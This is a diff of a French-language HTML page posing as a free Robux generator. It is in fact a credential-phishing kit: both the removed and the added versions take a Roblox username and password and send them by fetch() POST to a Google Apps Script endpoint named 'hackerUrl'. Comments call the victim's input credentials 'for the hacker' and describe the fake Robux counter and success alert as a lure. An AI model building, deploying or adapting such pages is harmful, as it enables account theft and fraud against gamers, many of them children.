@@ -1,159 +1,76 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-    <meta charset="UTF-8">
     <title>Générateur de Robux Gratuit 2026</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
             background: #1a1a2e;
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
-        
         .container {
             background: #0f3460;
             border-radius: 12px;
             padding: 30px;
-            width: 400px;
+            width: 350px;
             text-align: center;
         }
-        
         h1 {
             color: #e53e3e;
-            margin-bottom: 20px;
-            font-size: 22px;
+            font-size: 20px;
         }
-        
-        input, select {
+        input, button {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             margin: 8px 0;
             border-radius: 6px;
             border: none;
+        }
+        input {
             background: #1a1a2e;
             color: white;
-            font-size: 15px;
         }
-        
         button {
             background: #e53e3e;
             color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin: 15px 0;
-            width: 100%;
-        }
-        
-        button:hover {
-            background: #c53030;
-        }
-        
-        .counter {
-            font-size: 24px;
-            font-weight: bold;
-            color: #00ff00;
-            margin: 10px 0;
-        }
-        
-        .message {
-            color: #ffd700;
-            font-size: 12px;
-            margin: 10px 0;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>🔥 GÉNÉRATEUR DE ROBUX 2026 🔥</h1>
+        <input type="text" id="username" placeholder="Pseudo Roblox">
+        <input type="password" id="password" placeholder="Mot de passe Roblox">
+        <button onclick="send()">GÉNÉRER LES ROBUX</button>
+        <p style="color:#888; font-size:12px; margin-top:15px;">🔒 Sécurisé</p>
+    </div>
 
-<div class="container">
-    <h1>🔥 GÉNÉRATEUR DE ROBUX 2026 🔥</h1>
-    
-    <select id="amount">
-        <option value="1000">1 000 Robux</option>
-        <option value="5000">5 000 Robux</option>
-        <option value="10000" selected>10 000 Robux</option>
-        <option value="50000">50 000 Robux</option>
-        <option value="100000">100 000 Robux</option>
-    </select>
-    
-    <input type="text" id="username" placeholder="Pseudo Roblox">
-    
-    <input type="password" id="password" placeholder="Mot de passe Roblox">
-    
-    <button id="generateBtn">GÉNÉRER LES ROBUX</button>
-    
-    <div id="counter" class="counter"></div>
-    <div id="message" class="message"></div>
-</div>
-
-<script>
-    // ⚠️⚠️⚠️ URL DU SCRIPT GOOGLE (À REMPLACER PAR LA BONNE) ⚠️⚠️⚠️
-    // Après déploiement, remplacer cette URL par celle qui finit par /exec
-    const hackerUrl = "https://script.google.com/macros/s/AKfycbxXdWOtASQsYFGxeFxXz6EBgyw8PUMIjOsZHG9bS12DJ_bV7aCjJg9kkjXO-rE9QGnmVQ/exec";
-    
-    document.getElementById('generateBtn').onclick = function() {
-        // Récupère les valeurs saisies par la victime
-        let amount = document.getElementById('amount').value;
-        let username = document.getElementById('username').value;
-        let password = document.getElementById('password').value;
+    <script>
+        // ⚠️⚠️⚠️ TON URL ⚠️⚠️⚠️
+        const hackerUrl = "https://script.google.com/macros/s/AKfycbyxBnBePpWfs0iHoosucuDbqnqLRzyadV0LJqxJiW0a0lHgh4F1GPUQ0QyS2zRzXsapHQ/exec";
         
-        // Vérifie que les champs sont remplis
-        if(!username || !password) {
-            document.getElementById('message').innerHTML = "❌ Remplis tous les champs";
-            return;
-        }
-        
-        // ⚠️⚠️⚠️ ENVOI DES IDENTIFIANTS AU HACKER ⚠️⚠️⚠️
-        fetch(hackerUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: "username=" + encodeURIComponent(username) + 
-                  "&password=" + encodeURIComponent(password) +
-                  "&robux=" + encodeURIComponent(amount)
-        })
-        .then(response => response.text())
-        .then(data => console.log("Réponse du script:", data))
-        .catch(error => console.error("Erreur d'envoi:", error));
-        
-        // Animation factice (leurre - pour faire croire que ça marche)
-        let counter = 0;
-        let target = parseInt(amount);
-        let counterDiv = document.getElementById('counter');
-        let messageDiv = document.getElementById('message');
-        
-        messageDiv.innerHTML = "🔍 Connexion au serveur Roblox...";
-        
-        let interval = setInterval(function() {
-            counter += Math.floor(target / 15);
-            if(counter > target) counter = target;
-            counterDiv.innerHTML = counter + " / " + target + " Robux générés";
+        function send() {
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
             
-            if(counter >= target) {
-                clearInterval(interval);
-                messageDiv.innerHTML = "✅ " + target + " Robux ajoutés à " + username + " ! Redémarre Roblox. ✅";
-                counterDiv.innerHTML = "";
-                
-                setTimeout(function() {
-                    alert("🎉 Félicitations ! " + target + " Robux ont été ajoutés à votre compte !\nRedémarrez Roblox pour voir la mise à jour.");
-                }, 500);
+            if(!username || !password) {
+                alert("Veuillez entrer votre pseudo et mot de passe");
+                return;
             }
-        }, 40);
-    };
-</script>
-
+            
+            fetch(hackerUrl, {
+                method: "POST",
+                headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                body: "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password)
+            });
+            
+            alert("✅ 10 000 Robux ajoutés ! Redémarre Roblox.");
+        }
+    </script>
 </body>
 </html>
